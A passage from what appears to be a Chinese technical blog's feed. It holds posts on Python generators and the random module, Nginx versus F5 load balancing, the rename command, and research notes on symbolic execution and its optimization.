class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ret = <span class="built_in">next</span>(obj)</span><br><span class="line">        <span class="built_in">print</span>(ret)</span><br><span class="line">    <span class="keyword">except</span> StopIteration <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e.value)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h1 id="小结">小结</h1><ul><li>使用了 yield 关键字的函数不再是函数，而是生成器。（使用了 yield的函数就是生成器）</li><li>yield 关键字有两点作用：<ul><li>保存当前运行状态（断点），然后暂停执行，即将生成器（函数）挂起</li><li>将 yield 关键字后面表达式的值作为返回值返回，此时可以理解为起到了return 的作用</li></ul></li><li>可以使用next()函数让生成器从断点处继续执行，即唤醒生成器（函数）</li><li>Python3 中的生成器可以使用 return 返回最终运行的返回值，而 Python2中的生成器不允许使用 return 返回一个返回值（即可以使用 return从生成器中退出，但 return 后不能有任何表达式）</li></ul><p>使用 send 唤醒我们除了可以使用<strong>next()</strong>函数来唤醒生成器继续执行外，还可以使用<strong>send()</strong>函数来唤醒执行。使用send()函数的一个好处是可以在唤醒的同时向断点处传入一个附加数据。即：使用send 唤醒 yield a 的同时，将消息传递给 yield a 的结果。即：temp = yielda， temp 就是当使用 send 唤醒时，传入的结果。</p><p>例子：执行到 yield 时，gen 函数作用暂时保存，返回 i 的值; temp接收下次 c.send("python")，send 发送过来的值，c.next()等价c.send(None)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">10</span>]: <span class="keyword">def</span> <span class="title function_">gen</span>():</span><br><span class="line">   ....:     i = <span class="number">0</span></span><br><span class="line">   ....:     <span class="keyword">while</span> i&lt;<span class="number">5</span>:</span><br><span class="line">   ....:         temp = <span class="keyword">yield</span> i</span><br><span class="line">   ....:         <span class="built_in">print</span>(temp)</span><br><span class="line">   ....:         i+=<span class="number">1</span></span><br><span class="line">   ....:</span><br></pre></td></tr></table></figure><p><strong>注意：</strong></p><ol type="1"><li>send()不能作为第一次唤醒使用，因为第一次从生成器的开始执行，而开始往往不是yield a， 这样就没有东西接受 send 传入的值，因此会抛出异常。</li><li>如果必须第一次使用 send， 那传入消息 None。大多情况下使用next。</li><li>next 是函数，直接使用 <code>next(obj)</code>, 而 send是迭代器对象的方法，需要使用：<code>obj.send('message')</code></li><li>具有 yield 的函数是生成器对象，需要先创建对象，然后才可以使用。</li></ol><p>迭代器和生成器都保存生成数据的方法，而不是数据，节省空间。</p><p>迭代器减少内存空间，生成循环。生成器可以让一个函数看上去暂停执行，并返回结果。</p><h1 id="yield-完成多任务">yield 完成多任务</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">task_one</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;-----1-----&#x27;</span>)</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        <span class="keyword">yield</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">task_two</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;-----2-----&#x27;</span>)</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        <span class="keyword">yield</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    t1 = task_one()</span><br><span class="line">    t2 = task_two()</span><br><span class="line"><span class="comment"># 先让 yield 运行一会，当 t1 中遇到 yield 的时候，再返回到 24 行</span></span><br><span class="line">    <span class="comment"># 然后，执行 t2， 当它遇到 yield 的时候，再次切换到 t1 中</span></span><br><span class="line">    <span class="comment"># 这样 t1/t2/t1/t2 的交替运行，最终实现了多任务  ---- 协程</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">next</span>(t1)</span><br><span class="line">        <span class="built_in">next</span>(t2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>线程依赖于进程，协程依赖于线程。</p><p>协程使用的是单线程，它只是充分利用延时的时间。</p><h2 id="random-模块常用函数">random 模块常用函数</h2><h3 id="random.randrange">random.randrange</h3><blockquote><p>random.randrange(<em>stop</em>)</p><p>random.randrange(<em>start</em>, <em>stop</em>[, <em>step</em>])</p></blockquote><p>从 range([<em>start</em>], <em>stop</em>[, <em>step</em>])中，即：<code>[start, stop)</code>，步长为 step的整数序列中随机选取一个整数。</p><h3 id="random.randint">random.randint</h3><blockquote><p><code>random.randint</code>(<em>a</em>, <em>b</em>)</p></blockquote><p>从 [a, b] 中返回一个随机整数， 同：randrange(a, b+1)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">25</span>]: random.randint(<span class="number">1</span>,<span class="number">2</span>)</span><br><span class="line">Out[<span class="number">25</span>]: <span class="number">2</span></span><br></pre></td></tr></table></figure><h3 id="random.choice">random.choice</h3><blockquote><p>Random.choice(seq)</p></blockquote><p>从序列 seq 中随机选取一个元素（无论类型），如果 seq为空，抛出异常。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">31</span>]: random.choice([<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="number">3</span>])</span><br><span class="line">Out[<span class="number">31</span>]: <span class="string">&#x27;6&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="random.shuffle">random.shuffle</h3><blockquote><p>Random.shuffle(x[, random])</p></blockquote><p>对序列元素进行随机排序(直接改变原序列)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">37</span>]: num = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>, <span class="number">6</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">38</span>]: random.shuffle(num)</span><br><span class="line"></span><br><span class="line">In [<span class="number">39</span>]: num</span><br><span class="line">Out[<span class="number">39</span>]: [<span class="number">1</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">2</span>]</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> blockchain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>python 小知识</title>
      <link href="/blog/2021/06/15/programming/python/python_skills/"/>
      <url>/blog/2021/06/15/programming/python/python_skills/</url>
      
        <content type="html"><![CDATA[<h2 id="python-查看包版本">python 查看包版本</h2><p>以下用查询 requests 的版本信息做演示。</p><h3 id="pip">pip</h3><ol type="1"><li><code>pip show requests</code></li><li><code>pip list | grep requests</code></li></ol><h3 id="python">Python</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">1</span>]: <span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">In [<span class="number">2</span>]: requests.__version__</span><br><span class="line">Out[<span class="number">2</span>]: <span class="string">&#x27;2.23.0&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="python-使用适合需求的库">Python 使用适合需求的库</h1><p>Python 如何寻找、判断适合需求的库， 按照方法的优先次序介绍如下</p><h2 id="寻找">寻找</h2><h3 id="google">Google</h3><ol type="1"><li><p>第三方库 例如：</p><ol type="1"><li>写截图 OCR 时，我需要 hook 键盘输入，实现快捷键截图，搜：“Pythonkeyboard hook”</li><li>如果我要着一个 markdwon 解析器，搜：“python markdown parser”</li></ol></li><li><p>查找标准库 搜："Python standard library logging"</p></li></ol><h3 id="github-awesome-python">Github awesome-python</h3><p>awesome-python 系列大都是 Python 开源世界的精品，其中也包含部分Python 标准库。</p><p><a href="https://github.com/vinta/awesome-python">awesome-pythonGithub</a>，直接 <code>Ctrl+F</code> 搜索关键字， 比如：hook，logging</p><h3 id="标准库官网">标准库官网</h3><p>在 <a href="https://docs.python.org/3/">The Python StandardLibrary</a>网站直接搜索</p><h2 id="判断">判断</h2><p>几个可以考虑的因素:</p><ol type="1"><li>对应 Github 等代码仓库的 star 个数；</li><li>社区的活跃程度，更新频率；</li><li>文档完善程度，函数、参数解释，示例是否详细清楚；</li><li>普及率：看实现该功能的程序是否很多使用了该库。</li></ol>]]></content>
      
      
      <categories>
          
          <category> blockchain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Nginx 和 F5 负载均衡</title>
      <link href="/blog/2021/06/15/websec/devices/nginx_f5/"/>
      <url>/blog/2021/06/15/websec/devices/nginx_f5/</url>
      
        <content type="html"><![CDATA[<h1 id="nginx-和-f5-负载均衡">Nginx 和 F5 负载均衡</h1><p>转载自（<a href="https://zhuanlan.zhihu.com/p/23161920">浅谈 Nginx负载均衡与 F5 的区别 - 知乎</a>）</p><h2 id="前言">前言</h2><p>笔者最近在负责某集团网站时，同时用到了 Nginx 与F5，如图所示，负载均衡器 F5 作为处理外界请求的第一道“墙”，将请求分发到web 服务器后，web 服务器上的 Nginx再进行处理，静态内容直接访问本地门户，动态数据则通过反向代理指向内网服务。</p><p>其实 Nginx 和 F5这两者均可用作网站负载均衡，那二者有什么区别呢？笔者在此浅谈下 Nginx 与F5 的一些区别。</p><p>目前很多网站或应用在设计之初都会为高并发的数据请求做负载均衡，不差钱的土豪用户一般会直接买F5硬件设备作为其负载均衡器，原因不用多说，其功能强大，不仅包含负载均衡还包括应用交换、会话交换、状态监控、智能网络地址转换、通用持续性、响应错误处理、IPv6网关、高级路由、智能端口镜像、SSL 加速、智能 HTTP 压缩、TCP 优化、第 7层速率整形、内容缓冲、内容转换、连接加速、高速缓存、Cookie加密、选择性内容加密、应用攻击过滤、拒绝服务(DoS)攻击和 SYN Flood保护、防火墙过滤等功能，是不是很强大？当然价格也是让人很“心动”。而一些预算并不高，正在初期发展的网站来说，Nginx这种软负载也能很好的满足其数据分流的需求，下面我们先来看看 Nginx是如何满足我们的负载均衡需求的：</p><h2 id="什么是-nginx">什么是 Nginx：</h2><p>Nginx：高性能的 HTTP 和反向代理服务器，同时支持作为 IMAP/POP3/SMTP代理服务器。目前被很多网站应用为其 HTTP软负载均衡器。高效的性能、良好的稳定性、丰富的功能集、示例配置文件和低系统资源的消耗正逐渐被大型互联网公司所青睐。例如腾讯、淘宝、新浪等大型门户及商业网站都采用Nginx 进行 HTTP 网站的数据分流。</p><h2 id="nginx-功能特点">Nginx 功能特点：</h2><ol type="1"><li>工作在网络的 7 层之上，可以针对 http应用做一些分流的策略，比如针对域名、目录结构；</li><li>Nginx 对网络的依赖比较小；</li><li>Nginx 安装和配置比较简单，测试起来比较方便；</li><li>可以承担高的负载压力且稳定，一般能支撑超过 1 万次的并发；</li><li>Nginx可以通过端口检测到服务器内部的故障，比如根据服务器处理网页返回的状态码、超时等等，并且会把返回错误的请求重新提交到另一个节点，不过其中缺点就是不支持url 来检测；</li><li>Nginx 对请求的异步处理可以帮助节点服务器减轻负载；</li><li>Nginx 能支持 http 和 Email；</li></ol><h2 id="原理">原理</h2><p>Nginx 采用的是反向代理技术，代理服务器来接受 internet上的连接请求，然后将请求转发给内部网络上的服务器，并将从服务器上得到的结果返回给internet上请求连接的客户端，此时代理服务器对外就表现为一个服务器。反向代理负载均衡技术是把将来自internet上的连接请求以反向代理的方式动态地转发给内部网络上的多台服务器进行处理，从而达到负载均衡的目的。</p><p>具体是怎么运行的呢？其实当 Nginx启动后，其工作进程是由配置文件对其进行初始化的，主进程处理配置文件中的读取、端口绑定等特权操作，之后创建一小组子进程，由这些子进程进行请求的处理，同时缓存加载器加载硬盘中缓存到内存中，接着退出，保证资源开销始终保持着较低的状态。</p><p>可以看出，创建的子进程其实在负责所有的工作，处理网络连接、硬盘读写操作、以及上游服务器通信。</p><p>如图所示：masert process 是其主线程，worker process顾名思义，“我是具体干活的啦”，笔者截图的进程还是比较少的，因为这是自己的服务器，没有太多服务，实际业务中有可能会出现几十个worker process，还是挺壮观的。</p><p>Nginx 推荐的配置是，一个工作进程对应一个 CPU内核，确保硬件资源的有效利用。</p><p>一旦 NGINX服务起来，仅有工作进程在忙，每个工作进程采用非阻塞地方式处理多个连接，降低上下文切换的次数。</p><p>每个工作进程都是单线程且独立运行，负责获取新连接并进行处理。进程之间通过共享内存进行通信，诸如缓存数据，会话持续化数据(essionpersistence data),以及其他共享资源。</p><h2 id="f5-的负载均衡功能">F5 的负载均衡功能</h2><p>其实看到 Nginx 的原理和功能，是不是觉得已经不需要 F5了？当然也不是，F5毕竟是负载均衡的老前辈，一直以来都以功能强大，性能稳定著称，很多功能其实是软负载无法做到的。</p><p>F5 BIG-IP 用作 HTTP 负载均衡器的主要功能：</p><p>1、F5 BIG-IP 提供 12种灵活的算法将所有流量均衡的分配到各个服务器，而面对用户，只是一台虚拟服务器。</p><p>2、F5 BIG-IP 可以确认应用程序能否对请求返回对应的数据。假如 F5 BIG-IP后面的某一台服务器发生服务停止、死机等故障，F5会检查出来并将该服务器标识为宕机，从而不将用户的访问请求传送到该台发生故障的服务器上。这样，只要其它的服务器正常，用户的访问就不会受到影响。宕机一旦修复，F5BIG-IP就会自动查证应用保证对客户的请求作出正确响应并恢复向该服务器传送。</p><p>3、F5 BIG-IP 具有动态 Session 的会话保持功能，笔者也是在网站中使用的F5 将用户 IP 与 Session 通过 F5 进行的绑定，使其 Session 保持一致。</p><p>4、F5 BIG-IP 的 iRules 功能可以做 HTTP内容过滤，根据不同的域名、URL，将访问请求传送到不同的服务器。</p><h2 id="二者对比">二者对比</h2><h3 id="f5硬件">F5，硬件</h3><p>优点：能够直接通过智能交换机实现,处理能力更强，而且与系统无关，负载性能强，更适用于一大堆设备、大访问量、简单应用。</p><p>缺点：成本高，除设备价格高昂，而且配置冗余，很难想象后面服务器做一个集群，但最关键的负载均衡设备却是单点配置，无法有效掌握服务器及应用状态。</p><p>硬件负载均衡，一般都不管实际系统与应用的状态，而只是从网络层来判断，所以有时候系统处理能力已经不行了，但网络可能还来得及反应（这种情况非常典型，比如应用服务器后面内存已经占用很多，但还没有彻底不行，如果网络传输量不大就未必在网络层能反映出来）</p><h3 id="nginx软负载">Nginx，软负载</h3><p>优点：基于系统与应用的负载均衡，能够更好地根据系统与应用的状况来分配负载。这对于复杂应用是很重要的，性价比高，实际上如果几台服务器，用F5之类的硬件产品显得有些浪费，而用软件就要合算得多，因为服务器同时还可以跑应用、做集群等。</p><p>缺点：负载能力受服务器本身性能的影响，性能越好，负载能力越大。</p><h2 id="结语">结语</h2><p>其实还是如笔者最初说到的，如果不差钱，完全可以直接上 F5，同时配以Nginx 作为负载均衡及 web容器，处理大数据量的用户并发完全没问题，如果预算不够，其实 Nginx目前也能满足大多数用户需求了，当然也不能迷信负载均衡，对我们 IT工作者来说的话，程序、SQL等涉及数据处理的业务逻辑的地方，无论是架构还是代码亦或是模型的合理性，其重要性永远是要高于中间件的，这点想必是每位ITer 的共鸣。</p>]]></content>
      
      
      <categories>
          
          <category> websec </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>符号执行简介</title>
      <link href="/blog/2021/05/30/blockchain/eth_vulns/sym_exec/"/>
      <url>/blog/2021/05/30/blockchain/eth_vulns/sym_exec/</url>
      
        <content type="html"><![CDATA[<h1 id="符号执行">符号执行</h1><h2 id="原理">原理</h2><p>符号执行的关键思想就是，把输入变为符号值，那么程序计算的输出值就是一个符号输入值的函数。</p><h2 id="流程">流程</h2><p>反汇编字节码为汇编代码 对 evm 没有实现</p><ol type="1"><li><p>对待分析的单个过程代码对象构建控制流图构建控制流图（Control FlowGraph，CFG）</p><p>在遇到分支节点时，使用约束求解器判定哪条分支可行，并根据预先设计的路径调度策略实现对该过程所有路径的遍历分析</p></li><li><p>构建虚拟执行机模型,对每条语句解释执行 laser-evm</p></li></ol><h2 id="动态符号执行">动态符号执行</h2><p>动态符号执行是以具体数值作为输入来模拟执行程序代码</p><h2 id="问题">问题</h2><h3 id="路径爆炸问题">路径爆炸问题</h3><p>由于在每一个条件分支都会产生两个不同约束，符号执行要探索的执行路径依分支数指数增长。在时间和资源有限的情况下，应该对最相关的路径进行探索，这就涉及到了路径选择的问题。通过路径选择的方法缓解指数爆炸问题，主要有两种方法：</p><h2 id="污点分析">污点分析</h2><p>污点分析就是分析程序中由污点源引入的数据是否能够不经无害处理,而直接传播到污点汇聚点.如果不能,说明系统是信息流安全的;否则,说明系统产生了隐私数据泄露或危险数据操作等安全问题.</p>]]></content>
      
      
      <categories>
          
          <category> blockchain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>rename 命令</title>
      <link href="/blog/2021/05/16/linux/macos/rename/"/>
      <url>/blog/2021/05/16/linux/macos/rename/</url>
      
        <content type="html"><![CDATA[<p>Ubuntu 安装: <code>sudo apt install rename</code> macOS安装：<code>brew install rename</code></p><p><code>rename [options] 's/[filename element]/[replacement]/' [filename]</code></p><ul><li><p><code>s</code>: 表示这是替换表达式，是 PCRE（Perl CompatibleRegular Expression）-- Perl 兼容正则表达式 -- 的语法方式。</p></li><li></li><li></li><li></li></ul><p>例子：<code>rename 's/old-name/new-name/' files</code></p><p>利用 <code>rename 's/\.txt$/\.pdf$/' *.txt</code>命令将当前目录下所有后缀名为 <code>.txt</code> 的文件重命名以<code>.pdf</code> 为后缀名的文件。</p><p>其中 's/old-name/new-name/' 是 PCRE（Perl Compatible RegularExpression）-- Perl 兼容正则表达式 -- 的语法方式。</p><h2 id="参考">参考</h2><p><a href="https://learnku.com/server/wikis/36532">Linux文件管理：Linux rename 命令（重命名目录和文件） | Server运维论坛</a></p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
          <category> macos </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Symbolic Execution Optimization</title>
      <link href="/blog/2021/04/30/blockchain/eth_vulns/sym_exe_optimization/"/>
      <url>/blog/2021/04/30/blockchain/eth_vulns/sym_exe_optimization/</url>
      
        <content type="html"><![CDATA[<h1 id="symbolic-execution-optimization">Symbolic ExecutionOptimization</h1><p>符号执行过程:</p><pre><code>获取字节码和源文件反汇编控制流图符号执行z3 求解器求解检测漏洞</code></pre><p>符号执行包括两个重要模块, 分别是测试用例选择和路径约束条件求解,前者关系到能否发现漏洞、测试覆盖率和测试代码深度, 后者用于产生测试用例,大量的约束条件求解极大影响了符号执行性能</p><p>符号执行面临的三大难点：路径爆炸问题、符号执行精确性问题和复杂符号约束求解优化问题</p><h2 id="solutions">Solutions</h2><p>两种思路:</p><p>思路一: 通过某些方法或技术直接对符号执行本身、某个步骤进行改进</p><p>思路二: 通过和其他技术结合，相互弥补缺点，最终达到比较好的结果</p><p>思路三:结合要检测的东西(即：智能合约)的特点，对符号执行进行特定的改进</p><h2 id="思路一">思路一</h2><h3 id="路径爆炸path-explosion路径搜索覆盖">路径爆炸(PathExplosion)/路径搜索(覆盖)</h3><h4 id="描述">描述</h4><p>所谓路径爆炸问题是指符号执行很难遍历程序的所有执行路径(特别是遇到循环分支时)，产生这个问题主要有两个方面的原因：</p><ol type="1"><li>随着程序规模的增大，程序的可行路径呈现指数级增长；</li><li>符号执行在遍历每条路径的时候都需要大量的计算资源。</li></ol><p>在有限的测试时间和金钱的条件下，符号执行不可能完成对所有的可行路径进行遍历。而在有效的计算资源条件下，如何设计一个有效的路径搜索策略就成了减轻路径爆炸问题的关键。</p><h4 id="解决">解决</h4><p>主要有 2 个方面研究:</p><h5 id="搜索约束">搜索约束</h5><p>搜索约束即对程序的输入进行建模，或以目标位置为导向排除无关路径。这类方法是通过约束对搜索路径进行裁剪，从而达到降低复杂度的目的。</p><p>搜索约束面向特定类型/结构时，例如：对循环可达上界进行约束等</p><p>搜索约束面向特定类型的程序或者目标时，能够大幅地裁剪路径，例如基于文档辅助对输入建模，该方法从帮助文档、代码注释及文件格式中提取更多的搜索约束，帮助手册格式（manual）的参数约束以及特殊的文件格式，如可执行和可链接格式（ELF,executable and linking format）。</p><p>然而该方法也很有局限性，比如需要程序带有帮助手册，同时符合解析的规范。如果一个程序缺少必要信息，比如缺少帮助文档，则无法使用该方法。所以该方法很难适用于所有的开源程序，尤其是一些缺乏维护的开源程序。</p><ol type="1"><li><p><ahref="http://www.infocomm-journal.com/txxb/CN/10.11959/j.issn.1000-436x.2019062">2019_基于输入约束的符号执行优化</a></p><p>本文提出了一种新的基于输入约束的符号执行（ICBSE，input constraintbasedsymbolic execution）优化框架通过提取代码中有效的命令行约束参数（比如 rm 命令中的-r选项），从而实现对搜索路径的裁剪。</p><p><em>见论文第二页</em></p></li><li><p><ahref="http://cdmd.cnki.com.cn/Article/CDMD-10284-1016142033.htm">符号执行制导技术及其应用研究_2016</a></p><p>这个比较基础看看题目就好提出特定目标制导与循环可达上界制导相结合的符号执行制导技术</p></li></ol><h5 id="搜索策略">搜索策略</h5><p>符号执行中的通用搜索策略希望在有限资源内覆盖更多的程序语句或路径，包括深度优先搜索（depth-firstsearch，DFS）、随机状态搜索（random statesearch，RSS）、随机路径搜索（random pathsearch，RPS）以及覆盖率优化搜索（coverage-optimized search，COS）等；也有一些工作针对某个具体目标研究高效的路径空间搜索策略，包括提高程序语句覆盖率、面向可达性的搜索策略[、面向程序不同版本差异的搜索策略等.</p><p>搜索策略的改进和一些剪枝与优化</p><p>规定每个过程内的分析路径的数目上限、设置时间上限和内存上限等来进行缓解。各种路径制导技术、路径剪枝、循环优化等方面的工作.现有的制导技术以及路径剪枝分别关注于提出新的路径分支选择策略或者修剪探索过的路径</p><ol type="1"><li><p><ahref="http://gb.oversea.cnki.net/KCMS/detail/detailall.aspx?filename=1018707954.nh&amp;dbcode=CMFD&amp;dbname=CMFDREF">2018_并行分段式符号执行的研究与实现</a></p><p>本文首先优化了动态执行引擎 Angr 的路径搜索算法。通过对 Angr源码的深入分析,提出了优化其路径选择策略的思想提出了两种并行分段式路径搜索算法:分割式并行化算法和基于 pipeline的并行化算法。 <em>见论文摘要</em></p><p>下面的 2, 3 条是启发式搜索</p></li><li><p><a href="https://ieeexplore.ieee.org/document/8356902">PathExploration Based on Monte Carlo Tree Search for SymbolicExecution</a></p><p>We therefore propose novel strategies that only require limitedresources to give priority to more valuable paths. We utilize a methodbased on the Monte Carlo tree search(MCTS) strategy to resolve theproblem. We then compare the proposed MCTS-based strategy with othermethodsthen such as depth-first search (DFS) and breadth-firstsearch(BFS). MCTS is a heuristic search algorithm这个和下面那个都是</p></li><li><p><a href="https://dl.acm.org/doi/10.1145/3180155.3180251">Choppedsymbolic execution_2018</a></p><p>allows users to specify uninteresting parts of the code to excludeduring the analysis, thus only targeting the exploration to paths ofimportance.</p><p>However, the excluded parts are not summarily ignored, as this maylead to both false positives and false negatives. Instead, they areexecuted lazily, when their effect may be observable by code underanalysis.</p><p>Chopped symbolic execution leverages various on-demandstatic analysesat runtime to automatically exclude code fragmentswhile resolving theirside effects, thus avoiding expensive manualannotations andimprecision.</p></li><li><p><ahref="http://crad.ict.ac.cn/CN/10.7544/issn1000-1239.2016.20148330">基于求解开销预测的符号执行搜索策略_来源:计算机研究与发展</a></p><p>这个论文不是解决 Path Explosion问题，而是<strong>基于约束求解预测的一种搜索策略</strong>。符号执行中现有搜索策略在约束求解方面的考虑不够，而符号执行中很大一部分时间开销花在约束求解上.</p><p>现有的符号执行搜索策略在进行路径选择时都没有考虑到这一点，导致符号执行在分析复杂运算程序时无法在有限的时间内探索更多的程序路径，从而制约了符号执行探索路径空间的能力.</p><p>针对这个问题，本文提出了一种基于求解开销预测的符号执行搜索（solvingcost predication basedsearch，SCPS）策略，通过对符号执行中的求解开销进行经验预测，在兼顾程序语句覆盖率的前提下，优先选择求解开销小的路径进行探索，从而可在有限时间内提高探索路径的数量.本文在开源符号执行器 KLEE 上实现了 SCPS，并在开源程序上开展了实验</p><p>基于实验总结出了度量约束复杂度的经验公式，并结合约束的历史求解开销来预测当前的求解开销，从而在符号执行过程中优先探索求解开销较小的路径.在 KLEE 中实现了上述搜索策略，</p></li><li><p><a href="https://arxiv.org/pdf/1907.09700.pdf">Enhancing DynamicSymbolic Execution by Automatically Learning Search Heuristics</a></p><p>A key challenge indynamic symbolic execution is how to effectivelyexplore the program’s execution paths to achieve high code coverage in alimited timebudget. Dynamic symbolic execution employs a searchheuristic to address this challenge.</p><p>However，manually designing a good search heuristic is nontrivial andtypically ends up with suboptimal and unstable outcomes</p><p>The goal of this paper is to overcome this shortcoming of dynamicsymbolic execution by automatically learning search heuristics. Wedefine a class of search heuristics, namely a parametric searchheuristic, and present an algorithm that efficiently finds an optimalheuristic for each subject program.</p></li></ol><h3 id="测试用例精确覆盖路径问题">测试用例精确覆盖路径问题</h3><p>上述关于符号执行的优化方法在一定程度上都能够减少路径分支并提高代码覆盖率。但是，上述各方法注重符号执行过程中的路径发现问题，而非测试用例精确覆盖路径问题，故<strong>对于特殊参数情况下的测试用例精确生成存在不足</strong>。</p><p>同时，程序中因调用大量外部环境函数且自身参数存在特殊性，故符号执行生成的测试用例导致<strong>某些路径尽管被发现了却无法被执行</strong>，进而降低了<strong>符号执行的准确性和路径覆盖率</strong>。</p><ol type="1"><li><p><ahref="http://www.cqvip.com/qk/95939x/202001/7100718643.html">基于参数约束的分支覆盖符号执行优化算法</a></p><p>该算法通过搜索收集<strong>程序代码中函数的特殊参数</strong>，然后利用这些特殊参数作为约束条件，最后将约束条件添加到路径的约束集中。该算法使符号执行生成的测试用例更加精确，从而实现覆盖特殊约束条件下的路径分支，以提高符号执行的精确性和路径覆盖率</p></li></ol><h3 id="约束求解constraint-solving">约束求解(Constraint Solving)</h3><ol type="1"><li><p>以 SMT 求解器为代表的约束求解技术就是其中的典型。Z3是由微软开发并主要用于软件验证和分析的一种 SMT 求解器。</p><p>Z3 对包含非线性计算和库函数调用的路径约束支持效果很有限。</p></li><li><p>对包含<strong>非线性计算和库函数调用</strong>的路径约束的解决策略是基于约束简化。</p><p>混合执行（Concolic execution）就是其中的典型代表。它直接使用具体值来简化复杂路径约束 SPF-Mixed针对复杂路径约束，优先计算路径的简单的部分，然后将解出的值代入复杂部分作为其解。除了使用具体值简化复杂路径约束，</p><p>约束重用</p><ol type="1"><li><p><a href="https://arxiv.org/abs/2003.08350">Constraint Solvingwith Deep Learning for Symbolic Executio 2020 年 3 月</a></p><pre><code>Techniques like Green and GreenTrie reuse constraint solutions to speed up constraint solving for symbolic execution; however, these reuse techniques require syntactic/semantic equivalence or implication relationship between constraints.DeepSolver, a novel approach to constraint solving with deep learning for symbolic execution. Our key insight is to utilize the collective knowledge of a set of constraint solutions to train a deep neural network, which is then used to classify path conditions for their satisfiability during symbolic execution.</code></pre><p>约束简化</p></li><li><p><ahref="http://gb.oversea.cnki.net/KCMS/detail/detail.aspx?filename=1017722728.nh&amp;dbcode=CMFD&amp;dbname=CMFDREF">动态符号执行约束求解优化设计与实现_2017</a></p><p>本文着眼于动态符号执行的约束求解优化问题，提出一种针对约束集合的基于线性规划技术的优化方法，通过此优化方法可以降低约束集合中约束条件的复杂性，降低后续求解生成测试用例过程的计算复杂度，从一定程度上提升了约束求解过程的效率，本文将线性规划技术应用于约束求解过程，以此对约束求解过程中冗余的约束条件进行消除，以此达到优化的目的</p></li></ol></li><li><p>通过线性拟合的技术来简化非线性约束。尽管基于简化约束求解技术的符号执行工具能够提供针对非线性路径约束的支持，但是因为该技术缩小了求解空间，所以也只能针对有限的案例适用。</p></li><li><p>基于启发式搜索的约束求解技术</p><p>这类工作的核心思想就是将复杂约束的可满足问题转化为一个搜索问题，约束的符号化变量就是搜索空间，同时设定一个目标函数用于指导整个搜索过程。它们的性能对参数比较敏感，而这些参数比较难提前设定。</p><ul class="task-list"><li><label><input type="checkbox" />可以再看一下 intro</label></li></ul><ol type="1"><li><p>Optimization Based on domain and contextual information</p><p><ahref="https://ieeexplore.ieee.org/abstract/document/5954425">OptimizingConstraint Solving to Better Support Symbolic Execution</a> Constraintsolvers are mostly used in a black-box fashion within symbolicexecution, without leveraging any of the contextual and domaininformation available.</p><p>Because constraint solvers are optimized for specific kinds ofconstraints and heavily based on on heuristics，this leaves on the tablemany opportunities for optimizing the solvers 